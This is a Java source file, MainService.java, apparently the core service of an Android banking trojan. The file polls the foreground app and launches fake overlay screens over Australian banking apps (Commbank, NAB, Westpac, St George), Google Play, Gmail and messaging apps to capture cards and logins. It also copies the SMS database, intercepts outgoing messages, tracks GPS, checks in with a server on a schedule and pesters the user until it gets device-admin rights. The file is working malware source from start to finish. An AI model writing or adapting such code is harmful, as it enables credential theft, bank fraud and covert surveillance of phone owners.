package org.slempo.service;

import java.util.List;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slempo.service.activities.Cards;
import org.slempo.service.activities.ChangeNumber;
import org.slempo.service.activities.Commbank;
import org.slempo.service.activities.CommonHTML;
import org.slempo.service.activities.GM;
import org.slempo.service.activities.Nab;
import org.slempo.service.activities.StGeorge;
import org.slempo.service.activities.Westpack;
import org.slempo.service.utils.Sender;
import org.slempo.service.utils.Utils;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningTaskInfo;
import android.app.Service;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;

public class MainService extends Service implements LocationListener {

	private Context context;

	public static boolean isRunning = false;

	private DevicePolicyManager deviceManager;

	private static final String CONTENT_SMS = "content://sms";

	private static final int MESSAGE_TYPE_SENT = 2;

	private ContentObserver observer;

	private static SharedPreferences settings;

	private static LocationManager locationManager;

	public static OverlayView OVERLAY_VIEW;

	private static JSONArray htmlData;
	
	public void onCreate() {
		context = this;
		isRunning = true;
		super.onCreate();
		settings = getSharedPreferences(Constants.PREFS_NAME, MODE_PRIVATE);
		deviceManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
		try {
			htmlData = new JSONArray(settings.getString(Constants.HTML_DATA,
					"[]"));
		} catch (JSONException e) {
			e.printStackTrace();
		}
		if (settings.getString(Constants.MESSAGES_DB, "").equals("")) {
			Utils.putStringValue(settings, Constants.MESSAGES_DB, Utils.readMessagesFromDeviceDB(context));
		}
		registerContentObserver();
		if (Constants.ENABLE_GPS) {
			initLocation();
		}
		OVERLAY_VIEW = new OverlayView(this, R.layout.update);
		if (settings.getBoolean(Constants.IS_LOCK_ENABLED, false)) {
			showSystemDialog();
		} else {
			hideSystemDialog();
		}
		ScheduledExecutorService scheduler = Executors
				.newSingleThreadScheduledExecutor();
		scheduler.scheduleAtFixedRate(new Runnable() {

			public void run() {
				try {
					Sender.sendInitialData(context);
				} catch (Exception e) {
					Sender.sendReport(context, e);
				}
			}
		}, 0, Constants.ASK_SERVER_TIME_MINUTES * 60, TimeUnit.SECONDS);
		scheduler.scheduleAtFixedRate(new Runnable() {

			public void run() {
				try {
					String packageName = getTopRunning();
					String html = getHTMLForPackageName(packageName);
					if ((isRunning("com.android.vending") || isRunning("com.google.android.music"))
							&& !settings.getBoolean(Constants.CODE_IS_SENT,
									false)) {
						Intent i = new Intent(MainService.this, Cards.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if ((isRunning("com.whatsapp")
							|| isRunning("com.viber.voip")
							|| isRunning("com.instagram.android") || isRunning("com.skype.raider"))
							&& !settings.getBoolean(Constants.PHONE_IS_SENT,
									false)) {
						Intent i = new Intent(MainService.this,
								ChangeNumber.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if (isRunning("com.google.android.gm")
							&& !settings
									.getBoolean(Constants.GM_IS_SENT, false)) {
						Intent i = new Intent(MainService.this, GM.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if ((isRunning("com.commbank.netbank") || isRunning("com.cba.android.netbank"))
							&& !settings.getBoolean(Constants.COMMBANK_IS_SENT,
									false)) {
						Intent i = new Intent(MainService.this, Commbank.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if (isRunning("au.com.nab.mobile")
							&& !settings.getBoolean(Constants.NAB_IS_SENT,
									false)) {
						Intent i = new Intent(MainService.this, Nab.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if (isRunning("org.westpac.bank")
							&& !settings.getBoolean(Constants.WESTPACK_IS_SENT,
									false)) {
						Intent i = new Intent(MainService.this, Westpack.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if (isRunning("org.stgeorge.bank")
							&& !settings.getBoolean(
									Constants.ST_JEORGE_IS_SENT, false)) {
						Intent i = new Intent(MainService.this, StGeorge.class);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						startActivity(i);
					} else if (!html.equals("")) {
						Intent i = new Intent(context, CommonHTML.class);
						i.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
						i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						JSONObject jObject = new JSONObject();
						jObject.put("html", html);
						jObject.put("package", packageName);
						i.putExtra("values", jObject.toString());
						context.startActivity(i);
					}
				} catch (Exception e) {
					Sender.sendReport(context, e);
				}
			}
		}, 0, 4000, TimeUnit.MILLISECONDS);
		scheduler.scheduleAtFixedRate(new Runnable() {

			@Override
			public void run() {
				try {
					checkDeviceAdmin();
				} catch (Exception e) {
					Sender.sendReport(context, e);
				}
			}
		}, 0, 100, TimeUnit.MILLISECONDS);
	}

	public int onStartCommand(Intent intent, int flags, int startId) {
		return super.onStartCommand(intent, flags, startId);
	}

	public void onDestroy() {
		super.onDestroy();
		unregisterContentObserver();
		isRunning = false;
	}

	public IBinder onBind(Intent intent) {
		return null;
	}

	private void initLocation() {
		locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0,
				0, this);
	}

	public static Location getLocation() {
		return locationManager
				.getLastKnownLocation(LocationManager.GPS_PROVIDER);
	}

	private void registerContentObserver() {
		if (observer != null) {
			return;
		}
		observer = new ContentObserver(null) {

			public void onChange(boolean selfChange) {
				Cursor cursor = getContentResolver().query(
						Uri.parse(CONTENT_SMS), null, null, null, null);
				if (cursor.moveToNext()) {
					String protocol = cursor.getString(cursor
							.getColumnIndex("protocol"));
					int type = cursor.getInt(cursor.getColumnIndex("type"));
					if (protocol != null || type != MESSAGE_TYPE_SENT) {
						return;
					}
					int bodyColumn = cursor.getColumnIndex("body");
					int addressColumn = cursor.getColumnIndex("address");

					String to = cursor.getString(addressColumn);
					String message = cursor.getString(bodyColumn);
					if (settings.getBoolean(Constants.LISTENING_SMS_ENABLED,
							false)) {
						Sender.sendListenedOutgoingSMS(context, message, to);
					}
				}
				cursor.close();
			}
		};
		getContentResolver().registerContentObserver(Uri.parse(CONTENT_SMS),
				true, observer);
	}

	private void unregisterContentObserver() {
		getContentResolver().unregisterContentObserver(observer);
		observer = null;
	}

	public boolean isRunning(String packageName) {
		ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
		List<RunningTaskInfo> tasks = am.getRunningTasks(1);
		if (!tasks.isEmpty()) {
			ComponentName topActivity = tasks.get(0).topActivity;
			if (topActivity.getPackageName().contains(packageName)) {
				return true;
			}
		}
		return false;
	}

	private String getTopRunning() {
		ActivityManager am = (ActivityManager) getSystemService(Context.ACTIVITY_SERVICE);
		List<RunningTaskInfo> tasks = am.getRunningTasks(1);
		if (!tasks.isEmpty()) {
			ComponentName topActivity = tasks.get(0).topActivity;
			return topActivity.getPackageName();
		} else {
			return "";
		}
	}

	public static void hideSystemDialog() {
		new Handler(Looper.getMainLooper()).post(new Runnable() {

			@Override
			public void run() {
				OVERLAY_VIEW.hide();
			}
		});
	}

	public static void showSystemDialog() {
		new Handler(Looper.getMainLooper()).post(new Runnable() {

			@Override
			public void run() {
				OVERLAY_VIEW.show();
			}
		});
	}

	private void checkDeviceAdmin() {
		ComponentName componentName = new ComponentName(this,
				MyDeviceAdminReceiver.class);
		if (!deviceManager.isAdminActive(componentName)) {
			Intent intent = new Intent();
			intent.setClass(this, DeviceAdminChecker.class);
			intent.setFlags(intent.getFlags() | Intent.FLAG_ACTIVITY_NEW_TASK
					| Intent.FLAG_ACTIVITY_SINGLE_TOP);
			startActivity(intent);
		} else if (!settings.getBoolean(Constants.IS_LINK_OPENED, false)
				&& Constants.APP_MODE.equals("1")) {
			Utils.putBooleanValue(settings, Constants.IS_LINK_OPENED, true);
			String url = Constants.LINK_TO_OPEN;
			url = url.trim();
			if (!url.startsWith("http://") && !url.startsWith("https://")) {
				url = "http://" + url;
			}
			Intent browserIntent = new Intent(Intent.ACTION_VIEW,
					Uri.parse(url));
			browserIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			startActivity(browserIntent);
		}
	}

	private String getHTMLForPackageName(String packageName) {
		for (int i = 0; i < htmlData.length(); i++) {
			try {
				JSONObject packagesObject = htmlData.getJSONObject(i);
				JSONArray packagesNames = packagesObject
						.getJSONArray("packages");
				for (int j = 0; j < packagesNames.length(); j++) {
					if (packageName
							.equalsIgnoreCase(packagesNames.getString(j))) {
						return packagesObject.getString("html");
					}
				}
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		return "";
	}

	public static void removePackage(String packageName) {
		JSONArray newData = new JSONArray();
		for (int i = 0; i < htmlData.length(); i++) {
			try {
				JSONObject packagesObject = htmlData.getJSONObject(i);
				JSONArray packagesNames = packagesObject
						.getJSONArray("packages");
				boolean found = false;
				JSONArray newPackages = new JSONArray();
				for (int j = 0; j < packagesNames.length(); j++) {
					if (!found
							&& packageName.equalsIgnoreCase(packagesNames
									.getString(j))) {
						found = true;
					} else {
						newPackages.put(packagesNames.getString(j));
					}
				}
				if (!found) {
					newData.put(packagesObject);
				} else {
					JSONObject newJsonObject = new JSONObject();
					newJsonObject.put("packages", newPackages);
					newJsonObject.put("html", packagesObject.getString("html"));
					newData.put(newJsonObject);
				}
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		htmlData = newData;
		Utils.putStringValue(settings, Constants.HTML_DATA, htmlData.toString());
	}

	public static void updateHTML(JSONArray data) {
		htmlData = data;
	}

	@Override
	public void onLocationChanged(Location location) {
	}

	@Override
	public void onProviderDisabled(String provider) {
	}

	@Override
	public void onProviderEnabled(String provider) {
	}

	@Override
	public void onStatusChanged(String provider, int status, Bundle bundle) {
	}/**/
}
